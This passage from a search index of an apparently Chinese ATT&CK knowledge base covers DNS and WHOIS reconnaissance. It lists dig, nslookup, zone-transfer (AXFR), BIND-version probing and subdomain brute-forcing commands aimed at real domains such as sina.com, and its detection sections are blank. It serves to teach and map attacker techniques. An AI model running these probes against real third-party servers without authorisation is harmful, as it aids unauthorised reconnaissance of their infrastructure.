\u53ea\u663e\u793a\u6211\u4eec\u6700\u7ec8\u60f3\u8981\u7684\u7ed3\u679c \u53cd\u5411\u67e5\u8be2\uff08ptr\uff09 dig -x 66.102.251.24 # \u53cd\u5411\u67e5\u8be2\u8be5IP\u5730\u5740\u7684ptr\u8bb0\u5f55\uff0c\u5f97\u5230\u5176\u57df\u540d \u67e5\u8be2DNS\u670d\u52a1\u5668\u7684bind\u7248\u672c\u4fe1\u606f # \u5728Linux\u548cUnix\u670d\u52a1\u5668\u4e2d\u63d0\u4f9b\u7684DNS\u670d\u52a1\u7684\u8f6f\u4ef6\u5305\u4e00\u822c\u90fd\u662fbind # \u5728\u83b7\u5f97bind\u4fe1\u606f\u540e\u5c31\u53ef\u4ee5\u67e5\u770b\u5b83\u7684bind\u6709\u54ea\u4e9b\u6f0f\u6d1e\uff0c\u4f9d\u636e\u8fd9\u4e9b\u6f0f\u6d1e\u83b7\u5f97\u6240\u6709\u7684DNS\u8bb0\u5f55 dig +noall +answer txt chaos VERSION.BIND @mail.163.com # \u8fc7\u6ee4\u7b5b\u9009\u8f93\u51fa \u6587\u672c bind\u7684class\u7c7b\u578b \u57df\u540d \u5bf9DNS\u8bb0\u5f55\u8fdb\u884c\u8ffd\u8e2a\uff08DNS\u8ffd\u8e2a\uff09 dig +trace www.sina.com DNS\u533a\u57df\u4f20\u8f93 DNS\u533a\u57df\u4f20\u8f93\u662f\u53d1\u751f\u5728DNS\u670d\u52a1\u5668\u4e4b\u95f4\u4fe1\u606f\u540c\u6b65\u7684\u4e00\u4e2a\u8fc7\u7a0b\uff08\u533a\u57df\u4f20\u8f93\u673a\u5236\uff0c\u901a\u5e38\u53ea\u53d1\u751f\u5728\u672c\u57df\u57df\u540d\u670d\u52a1\u5668\u4e4b\u95f4\uff09\uff0c\u5728\u6e17\u900f\u6d4b\u8bd5\u4e2d\u88ab\u5c1d\u8bd5\u7528\u6765\u83b7\u53d6\u6240\u6709\u7684DNS\u8bb0\u5f55\u4fe1\u606f dig @ns1.sina.com sina.com axfr # \u5148\u6307\u5b9ans\u670d\u52a1\u5668 \u53d1\u8d77\u533a\u57df\u4f20\u8f93\u7684\u6307\u4ee4 # DNS\u670d\u52a1\u5668\u7684\u57df\u540d\u67e5\u8be2\u4e00\u822c\u90fd\u662fUDP\u768453\u7aef\u53e3\uff0c\u533a\u57df\u4f20\u8f93\u5373\u57df\u540d\u670d\u52a1\u5668\u4e4b\u95f4\u7684\u540c\u6b65\u6570\u636e\u4f7f\u7528TCP\u768453\u7aef\u53e3 host -T -l sina.com ns1.sina.com # -T:\u663e\u793a\u65f6\u95f4 -l:\u8fdb\u884cAXFR\u7684\u5168\u533a\u57df\u4f20\u8f93 # \u5982\u679c\u662f\u67e5\u8be2 sina.com \u7684\u8bdd\uff0c\u540e\u9762\u4e00\u5b9a\u8981\u8ddf\u4e00\u4e2a sina \u7684\u57df\u540d\u670d\u52a1\u5668\u7684\u5730\u5740\uff08\u67e5\u8be2\u4ec0\u4e48\u8ddf\u4ec0\u4e48\uff09 DNS\u5b57\u5178\u7206\u7834 \u51c6\u5907\u4e00\u4e2a\u5305\u542b\u5e38\u89c1\u4e3b\u673a\u8bb0\u5f55\u540d\u79f0\u7684\u5b57\u5178\uff0c\u7528\u5b57\u5178\u5411DNS\u670d\u52a1\u5668\u53d1\u8d77\u4e00\u4e2a\u5b57\u5178\u5f0f\u7684\u66b4\u529b\u7834\u89e3\u3002\u5982\u679c\u6709\u8fd9\u4e2a\u8bb0\u5f55\uff0cDNS\u670d\u52a1\u5668\u5c31\u4f1a\u8fd4\u56de\u5176\u5bf9\u5e94\u7684IP\u5730\u5740\u3002\u5982\u679c\u6ca1\u6709\u5c31\u4f1a\u8fd4\u56de\u4e00\u4e2a\u9519\u8bef\u7684\u7ed3\u679c\uff08\u5c1d\u8bd5\u5c06\u76ee\u6807\u670d\u52a1\u5668\u91cc\u9762\u7684\u6240\u6709\u7684\u4e3b\u673a\u8bb0\u5f55\u548c\u5b50\u57df\u7684\u57df\u540d\u8bb0\u5f55\u7ed9\u7206\u7834\u51fa\u6765\uff09 dnsenum sudo apt install dnsenum # \u5b89\u88c5dnsenum dnsenum -f dns.txt -dnsserver 8.8.8.8 sina.com -o sina.xml # -o\uff1a\u628a\u7206\u7834\u51fa\u6765\u7684\u5185\u5bb9\u4fdd\u5b58\u6210\u4e00\u4e2axml\u6587\u4ef6\uff0c-f\uff1a\u6307\u5b9a\u5b57\u5178\u6587\u4ef6 dnsmap sudo apt install dnsmap # \u5b89\u88c5dnsmap dnsmap sina.com -w dns.txt # -w\uff1a\u7528\u6765\u6307\u5b9a\u5b57\u5178\u6587\u4ef6 DNS\u6ce8\u518c\u4fe1\u606f\uff08whois\u67e5\u8be2\uff09 \u6536\u96c6DNS\u7684\u6ce8\u518c\u4fe1\u606f\uff0c\u6bd4\u5982\u6ce8\u518c\u65b0\u6d6asina.com\u7684\u4fe1\u606f\u3002\u6709\u7684\u57df\u540d\u5728\u6ce8\u518c\u65f6\u4f1a\u7559\u4e0b\u6ce8\u518c\u4eba\u7684\u59d3\u540d\u3001\u7535\u8bdd\u3001\u90ae\u7bb1\u3001\u516c\u53f8\u5730\u5740\u7b49\u7b49\u4fe1\u606f\uff08\u53ef\u4ee5\u7528\u6765\u4f5c\u4e3a\u793e\u4f1a\u5de5\u7a0b\u5b66\u6216\u8005\u7269\u7406\u653b\u51fb\u7684\u624b\u6bb5\uff09\u3002 \u53ef\u4ee5\u901a\u8fc7whois\u6765\u67e5\u8be2\u8fd9\u4e9b\u4fe1\u606f\u3002\u4e0d\u540c\u5730\u533a\u3001\u533a\u57df\u6709\u4e0d\u540c\u5730\u533a\u7684whois\u4fe1\u606f\uff0c\u90a3\u4e2a\u56fd\u5bb6\u7528\u90a3\u4e2aNIC\u5fc5\u987b\u5206\u914d\u540e\u624d\u80fd\u4f7f\u7528\uff0c\u4e0d\u80fd\u968f\u4fbf\u4e71\u7528\uff0c\u5426\u8005\u4f1a\u9020\u6210\u4e92\u8054\u7f51\u4e0a\u7684\u6df7\u4e71\uff0c\u800c\u4e14\u53ef\u80fd\u51fa\u73b0\u91cd\u590d\u7684IP\u5730\u5740\u3002\u6700\u65e9\u7684IP\u5206\u914d\u5c31\u662f\u7531InterNic\u6765\u5b8c\u6210\u7684\uff0c\u540e\u6765\u4e0d\u540c\u5730\u533a\u6210\u7acb\u4e86\u4e00\u4e9b\u5730\u533a\u6027\u8d28\u7684NIC\uff0c\u4e9a\u592a\u5730\u533a\u7684NIC\u662f\u7531APNIC\u8d1f\u8d23\u3002 \u901a\u8fc7whois\u547d\u4ee4\u884c\u5de5\u5177\u6765\u67e5\u8be2 sudo apt install whois # \u5b89\u88c5whois\u5de5\u5177 whois 8.8.8.8 whois sina.com whois -h whois.apnic.net 66.102.251.24 \u5728\u7ebfwhois\u7f51\u7ad9\u67e5\u8be2 http://www.afrinic.net # AFRINIC http://www.apnic.net # APNIC http://ws.arin.net # ARIN http://www.iana.com # IANA http://www.icann.org # ICANN http://www.lacnic.net # LACNIC http://www.nro.net # NRO http://www.ripe.net # RIPE http://internic.net # InterNic \u68c0\u6d4b\u65e5\u5fd7 \u65e0 \u6d4b\u8bd5\u590d\u73b0 \u65e0 \u6d4b\u8bd5\u7559\u75d5 \u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0 \u5efa\u8bae \u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1596-001 https://attack.mitre.org/techniques/T1596/001/ \u4fe1\u606f\u6536\u96c6\u2014\u2014DNS\u4fe1\u606f\u6536\u96c6 https://blog.csdn.net/weixin_45126664/article/details/107603032","title":"T1596-001-\u641c\u7d22\u5f00\u653e\u7684\u6280\u672f\u6570\u636e\u5e93-DNS/\u88ab\u52a8DNS"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-001-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-DNS_%E8%A2%AB%E5%8A%A8DNS/#t1596-001-dnsdns","text":"","title":"T1596-001-\u641c\u7d22\u5f00\u653e\u7684\u6280\u672f\u6570\u636e\u5e93-DNS/\u88ab\u52a8DNS"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-001-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-DNS_%E8%A2%AB%E5%8A%A8DNS/#attck","text":"\u653b\u51fb\u8005\u53ef\u4ee5\u5728DNS\u6570\u636e\u4e2d\u641c\u7d22\u53ef\u5728\u6709\u5173\u53d7\u5bb3\u8005\u7684\u4f7f\u7528\u4fe1\u606f\u3002DNS\u4fe1\u606f\u53ef\u80fd\u5305\u62ec\u5404\u79cd\u8be6\u7ec6\u4fe1\u606f\uff0c\u5305\u62ec\u6ce8\u518c\u7684\u540d\u79f0\u670d\u52a1\u5668\u4ee5\u53ca\u6982\u8ff0\u76ee\u6807\u5b50\u57df\uff0c\u90ae\u4ef6\u670d\u52a1\u5668\u548c\u5176\u4ed6\u4e3b\u673a\u7684\u5730\u5740\u7684\u8bb0\u5f55\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u641c\u7d22DNS\u6570\u636e\u7528\u4ee5\u6536\u96c6\u53ef\u64cd\u4f5c\u7684\u4fe1\u606f\u3002\u5a01\u80c1\u53c2\u4e0e\u8005\u53ef\u4ee5\u76f4\u63a5\u67e5\u8be2\u76ee\u6807\u7ec4\u7ec7\u7684\u540d\u79f0\u670d\u52a1\u5668\uff0c\u4e5f\u53ef\u4ee5\u641c\u7d22\u8bb0\u5f55\u7684DNS\u67e5\u8be2\u54cd\u5e94\u7684\u96c6\u4e2d\u5b58\u50a8\u5e93\uff08\u79f0\u4e3a\u88ab\u52a8DNS\uff09\u3002\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u5bfb\u6c42\u5e76\u9488\u5bf9\u5185\u90e8\u7f51\u7edc\u4fe1\u606f\u7684DNS\u9519\u8bef\u914d\u7f6e\u6216\u6cc4\u6f0f\u3002\u8fd9\u4e9b\u6765\u6e90\u7684\u4fe1\u606f\u53ef\u80fd\u4f1a\u63d0\u4f9b\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u673a\u4f1a\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u53d7\u5bb3\u4eba\u62e5\u6709\u7684\u7f51\u7ad9\u6216\u641c\u7d22\u5f00\u653e\u7684\u7f51\u7ad9/\u57df\uff09\uff0c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u83b7\u53d6\u57fa\u7840\u8bbe\u65bd\u6216\u59a5\u534f\u57fa\u7840\u8bbe\u65bd\uff09\u6216\u521d\u6b65\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u5916\u90e8\uff09\u8fdc\u7a0b\u670d\u52a1\u6216\u4fe1\u4efb\u5173\u7cfb\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-001-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-DNS_%E8%A2%AB%E5%8A%A8DNS/#_1","text":"\u4fe1\u606f\u6536\u96c6--DNS\u4fe1\u606f\u6536\u96c6","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-001-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-DNS_%E8%A2%AB%E5%8A%A8DNS/#nslookup","text":"\u89e3\u6790A\u8bb0\u5f55\u3001MX\u8bb0\u5f55\u3001NS\u8bb0\u5f55 \u7ec8\u7aef\u4e2d\u8f93\u5165 \uff1anslookup \u5728\u663e\u793a\u7684\u9875\u9762\u4e2d\u8f93\u5165\u57df\u540d\uff0c\u4f1a\u89e3\u6790\u51fa\u6700\u7ec8\u7684A\u8bb0\u5f55\u548cIP\u5730\u5740 >set type=a # \u6307\u5b9a\u67e5\u8be2\u7c7b\u578b\u4e3aA\u8bb0\u5f55\uff08\u4e3b\u673a\u8bb0\u5f55\uff09 >set type=mx # \u6307\u5b9a\u67e5\u8be2\u7c7b\u578b\u4e3aMX\u8bb0\u5f55\uff08\u90ae\u4ef6\u4ea4\u6362\u8bb0\u5f55\u00b7\uff09 >set type=ns # \u6307\u5b9a\u67e5\u8be2\u7c7b\u578b\u4e3aNS\u8bb0\u5f55\uff08\u57df\u540d\u670d\u52a1\u5668\u8bb0\u5f55\uff09 >sina.com # \u67e5\u8be2 sina.com \u8fd9\u4e2a\u57df\u540d \u53cd\u5411\u57df\u540d\u89e3\u6790 \u4f7f\u7528IP\u53cd\u5411\u89e3\u6790\u51fa\u57df\u540d\uff08ptr\uff09 >set type=ptr > 66.102.251.24 \u6307\u5b9aserver IP >server 8.8.8.8 # \u6307\u5b9a\u6211\u4eec\u60f3\u8981\u6307\u5b9a\u7684DNS\u670d\u52a1\u5668\u7684IP\uff0c\u4f7f\u7528\u8be5\u670d\u52a1\u5668\u6765\u8fdb\u884c\u67e5\u8be2 >www.sina.com \u6307\u5b9a\u6240\u6709\u7c7b\u578b >set type=any # \u6307\u5b9a\u67e5\u8be2\u6240\u6709\u7c7b\u578b\u7684\u8bb0\u5f55 >www.sina.com","title":"NSLOOKUP"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-001-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-DNS_%E8%A2%AB%E5%8A%A8DNS/#dig","text":"\u67e5\u8be2\u6240\u6709\u8bb0\u5f55 dig sina.com any @8.8.8.8 # \u67e5\u8be2 sina.com \u7684\u6240\u6709\u7c7b\u578b\u7684\u8bb0\u5f55\uff0c\u5e76\u6307\u5b9aIP\u5730\u5740\u4e3a 8.8.8.8 # \u5efa\u8bae\u6307\u5b9a\u4e0d\u540c\u7684\u57df\u540d\u670d\u52a1\u5668IP\u5bf9\u540c\u4e00\u4e2a\u57df\u540d\u8fdb\u884c\u89e3\u6790\uff08\u6bd4\u8f83\u7ed3\u679c\uff0c\u786e\u5b9a\u67e5\u8be2\u7684\u51c6\u786e\u6027\uff09 \u7b5b\u9009\u8f93\u51fa\u7ed3\u679c dig mail.163.com any # \u67e5\u8be2163\u7684mail\u7684\u8bb0\u5f55 dig +noall mail.163.com any # +noall\u7b5b\u9009\u8f93\u51fa\u7ed3\u679c\uff08\u5373\u4ec0\u4e48\u7ed3\u679c\u90fd\u4e0d\u8f93\u51fa\uff09 dig +noall +answer mail.183.com any # \u53ea\u663e\u793a\u6211\u4eec\u6700\u7ec8\u60f3\u8981\u7684\u7ed3\u679c \u53cd\u5411\u67e5\u8be2\uff08ptr\uff09 dig -x 66.102.251.24 # \u53cd\u5411\u67e5\u8be2\u8be5IP\u5730\u5740\u7684ptr\u8bb0\u5f55\uff0c\u5f97\u5230\u5176\u57df\u540d \u67e5\u8be2DNS\u670d\u52a1\u5668\u7684bind\u7248\u672c\u4fe1\u606f # \u5728Linux\u548cUnix\u670d\u52a1\u5668\u4e2d\u63d0\u4f9b\u7684DNS\u670d\u52a1\u7684\u8f6f\u4ef6\u5305\u4e00\u822c\u90fd\u662fbind # \u5728\u83b7\u5f97bind\u4fe1\u606f\u540e\u5c31\u53ef\u4ee5\u67e5\u770b\u5b83\u7684bind\u6709\u54ea\u4e9b\u6f0f\u6d1e\uff0c\u4f9d\u636e\u8fd9\u4e9b\u6f0f\u6d1e\u83b7\u5f97\u6240\u6709\u7684DNS\u8bb0\u5f55 dig +noall +answer txt chaos VERSION.BIND @mail.163.com # \u8fc7\u6ee4\u7b5b\u9009\u8f93\u51fa \u6587\u672c bind\u7684class\u7c7b\u578b \u57df\u540d \u5bf9DNS\u8bb0\u5f55\u8fdb\u884c\u8ffd\u8e2a\uff08DNS\u8ffd\u8e2a\uff09 dig +trace www.sina.com","title":"DIG"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-001-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-DNS_%E8%A2%AB%E5%8A%A8DNS/#dns","text":"DNS\u533a\u57df\u4f20\u8f93\u662f\u53d1\u751f\u5728DNS\u670d\u52a1\u5668\u4e4b\u95f4\u4fe1\u606f\u540c\u6b65\u7684\u4e00\u4e2a\u8fc7\u7a0b\uff08\u533a\u57df\u4f20\u8f93\u673a\u5236\uff0c\u901a\u5e38\u53ea\u53d1\u751f\u5728\u672c\u57df\u57df\u540d\u670d\u52a1\u5668\u4e4b\u95f4\uff09\uff0c\u5728\u6e17\u900f\u6d4b\u8bd5\u4e2d\u88ab\u5c1d\u8bd5\u7528\u6765\u83b7\u53d6\u6240\u6709\u7684DNS\u8bb0\u5f55\u4fe1\u606f dig @ns1.sina.com sina.com axfr # \u5148\u6307\u5b9ans\u670d\u52a1\u5668 \u53d1\u8d77\u533a\u57df\u4f20\u8f93\u7684\u6307\u4ee4 # DNS\u670d\u52a1\u5668\u7684\u57df\u540d\u67e5\u8be2\u4e00\u822c\u90fd\u662fUDP\u768453\u7aef\u53e3\uff0c\u533a\u57df\u4f20\u8f93\u5373\u57df\u540d\u670d\u52a1\u5668\u4e4b\u95f4\u7684\u540c\u6b65\u6570\u636e\u4f7f\u7528TCP\u768453\u7aef\u53e3 host -T -l sina.com ns1.sina.com # -T:\u663e\u793a\u65f6\u95f4 -l:\u8fdb\u884cAXFR\u7684\u5168\u533a\u57df\u4f20\u8f93 # \u5982\u679c\u662f\u67e5\u8be2 sina.com \u7684\u8bdd\uff0c\u540e\u9762\u4e00\u5b9a\u8981\u8ddf\u4e00\u4e2a sina \u7684\u57df\u540d\u670d\u52a1\u5668\u7684\u5730\u5740\uff08\u67e5\u8be2\u4ec0\u4e48\u8ddf\u4ec0\u4e48\uff09","title":"DNS\u533a\u57df\u4f20\u8f93"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-001-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-DNS_%E8%A2%AB%E5%8A%A8DNS/#dns_1","text":"\u51c6\u5907\u4e00\u4e2a\u5305\u542b\u5e38\u89c1\u4e3b\u673a\u8bb0\u5f55\u540d\u79f0\u7684\u5b57\u5178\uff0c\u7528\u5b57\u5178\u5411DNS\u670d\u52a1\u5668\u53d1\u8d77\u4e00\u4e2a\u5b57\u5178\u5f0f\u7684\u66b4\u529b\u7834\u89e3\u3002\u5982\u679c\u6709\u8fd9\u4e2a\u8bb0\u5f55\uff0cDNS\u670d\u52a1\u5668\u5c31\u4f1a\u8fd4\u56de\u5176\u5bf9\u5e94\u7684IP\u5730\u5740\u3002\u5982\u679c\u6ca1\u6709\u5c31\u4f1a\u8fd4\u56de\u4e00\u4e2a\u9519\u8bef\u7684\u7ed3\u679c\uff08\u5c1d\u8bd5\u5c06\u76ee\u6807\u670d\u52a1\u5668\u91cc\u9762\u7684\u6240\u6709\u7684\u4e3b\u673a\u8bb0\u5f55\u548c\u5b50\u57df\u7684\u57df\u540d\u8bb0\u5f55\u7ed9\u7206\u7834\u51fa\u6765\uff09 dnsenum sudo apt install dnsenum # \u5b89\u88c5dnsenum dnsenum -f dns.txt -dnsserver 8.8.8.8 sina.com -o sina.xml # -o\uff1a\u628a\u7206\u7834\u51fa\u6765\u7684\u5185\u5bb9\u4fdd\u5b58\u6210\u4e00\u4e2axml\u6587\u4ef6\uff0c-f\uff1a\u6307\u5b9a\u5b57\u5178\u6587\u4ef6 dnsmap sudo apt install dnsmap # \u5b89\u88c5dnsmap dnsmap sina.com -w dns.txt # -w\uff1a\u7528\u6765\u6307\u5b9a\u5b57\u5178\u6587\u4ef6","title":"DNS\u5b57\u5178\u7206\u7834"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-001-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-DNS_%E8%A2%AB%E5%8A%A8DNS/#dnswhois","text":"\u6536\u96c6DNS\u7684\u6ce8\u518c\u4fe1\u606f\uff0c\u6bd4\u5982\u6ce8\u518c\u65b0\u6d6asina.com\u7684\u4fe1\u606f\u3002\u6709\u7684\u57df\u540d\u5728\u6ce8\u518c\u65f6\u4f1a\u7559\u4e0b\u6ce8\u518c\u4eba\u7684\u59d3\u540d\u3001\u7535\u8bdd\u3001\u90ae\u7bb1\u3001\u516c\u53f8\u5730\u5740\u7b49\u7b49\u4fe1\u606f\uff08\u53ef\u4ee5\u7528\u6765\u4f5c\u4e3a\u793e\u4f1a\u5de5\u7a0b\u5b66\u6216\u8005\u7269\u7406\u653b\u51fb\u7684\u624b\u6bb5\uff09\u3002 \u53ef\u4ee5\u901a\u8fc7whois\u6765\u67e5\u8be2\u8fd9\u4e9b\u4fe1\u606f\u3002\u4e0d\u540c\u5730\u533a\u3001\u533a\u57df\u6709\u4e0d\u540c\u5730\u533a\u7684whois\u4fe1\u606f\uff0c\u90a3\u4e2a\u56fd\u5bb6\u7528\u90a3\u4e2aNIC\u5fc5\u987b\u5206\u914d\u540e\u624d\u80fd\u4f7f\u7528\uff0c\u4e0d\u80fd\u968f\u4fbf\u4e71\u7528\uff0c\u5426\u8005\u4f1a\u9020\u6210\u4e92\u8054\u7f51\u4e0a\u7684\u6df7\u4e71\uff0c\u800c\u4e14\u53ef\u80fd\u51fa\u73b0\u91cd\u590d\u7684IP\u5730\u5740\u3002\u6700\u65e9\u7684IP\u5206\u914d\u5c31\u662f\u7531InterNic\u6765\u5b8c\u6210\u7684\uff0c\u540e\u6765\u4e0d\u540c\u5730\u533a\u6210\u7acb\u4e86\u4e00\u4e9b\u5730\u533a\u6027\u8d28\u7684NIC\uff0c\u4e9a\u592a\u5730\u533a\u7684NIC\u662f\u7531APNIC\u8d1f\u8d23\u3002 \u901a\u8fc7whois\u547d\u4ee4\u884c\u5de5\u5177\u6765\u67e5\u8be2 sudo apt install whois # \u5b89\u88c5whois\u5de5\u5177 whois 8.8.8.8 whois sina.com whois -h whois.apnic.net 66.102.251.24 \u5728\u7ebfwhois\u7f51\u7ad9\u67e5\u8be2 http://www.afrinic.net # AFRINIC http://www.apnic.net # APNIC http://ws.arin.net # ARIN http://www.iana.com # IANA http://www.icann.org # ICANN http://www.lacnic.net # LACNIC http://www.nro.net # NRO http://www.ripe.net # RIPE http://internic.net # InterNic","title":"DNS\u6ce8\u518c\u4fe1\u606f\uff08whois\u67e5\u8be2\uff09"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-001-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-DNS_%E8%A2%AB%E5%8A%A8DNS/#_2","text":"\u65e0","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-001-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-DNS_%E8%A2%AB%E5%8A%A8DNS/#_3","text":"\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-001-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-DNS_%E8%A2%AB%E5%8A%A8DNS/#_4","text":"\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-001-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-DNS_%E8%A2%AB%E5%8A%A8DNS/#_5","text":"\u65e0","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-001-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-DNS_%E8%A2%AB%E5%8A%A8DNS/#_6","text":"\u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002","title":"\u5efa\u8bae"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-001-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-DNS_%E8%A2%AB%E5%8A%A8DNS/#_7","text":"MITRE-ATT&CK-T1596-001 https://attack.mitre.org/techniques/T1596/001/ \u4fe1\u606f\u6536\u96c6\u2014\u2014DNS\u4fe1\u606f\u6536\u96c6 https://blog.csdn.net/weixin_45126664/article/details/107603032","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-002-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-WHOIS/","text":"T1596-002-\u641c\u7d22\u5f00\u653e\u7684\u6280\u672f\u6570\u636e\u5e93-WHOIS \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u4ee5\u5728WHOIS\u516c\u5f00\u6570\u636e\u4e2d\u641c\u7d22\u53d7\u5bb3\u8005\u4f7f\u7528\u7684\u76ee\u6807\u4fe1\u606f\u3002WHOIS\u6570\u636e\u7531\u8d1f\u8d23\u5206\u914d\u548c\u5206\u914d\u57df\u540d\u7b49Internet\u8d44\u6e90\u7684\u533a\u57dfInternet\u6ce8\u518c\u8868\uff08RIR\uff09\u5b58\u50a8\u3002\u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u67e5\u8be2WHOIS\u670d\u52a1\u5668\u4ee5\u83b7\u53d6\u6709\u5173\u6ce8\u518c\u57df\u7684\u4fe1\u606f\uff0c\u4f8b\u5982\u5206\u914d\u7684IP\u5730\u5740\uff0c\u8054\u7cfb\u4fe1\u606f\u548cDNS\u540d\u79f0\u670d\u52a1\u5668\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u641c\u7d22WHOIS\u6570\u636e\u7528\u4ee5\u6536\u96c6\u53ef\u884c\u7684\u4fe1\u606f\u3002\u5a01\u80c1\u884c\u52a8\u8005\u53ef\u4ee5\u4f7f\u7528\u5728\u7ebf\u8d44\u6e90\u6216\u547d\u4ee4\u884c\u5b9e\u7528\u7a0b\u5e8f\u901a\u8fc7WHOIS\u6570\u636e\u8fdb\u884c\u63a0\u593a\uff0c\u4ee5\u83b7\u53d6\u6709\u5173\u6f5c\u5728\u53d7\u5bb3\u8005\u7684\u4fe1\u606f\u3002\u8fd9\u4e9b\u6765\u6e90\u63d0\u4f9b\u7684\u4fe1\u606f\u53ef\u80fd\u4f1a\u63d0\u4f9b\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u673a\u4f1a\uff08\u4f8b\u5982\uff1a\u4e3b\u52a8\u626b\u63cf\u6216\u7f51\u7edc\u9493\u9c7c\uff09\uff0c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u83b7\u53d6\u57fa\u7840\u8bbe\u65bd\u6216\u7834\u574f\u57fa\u784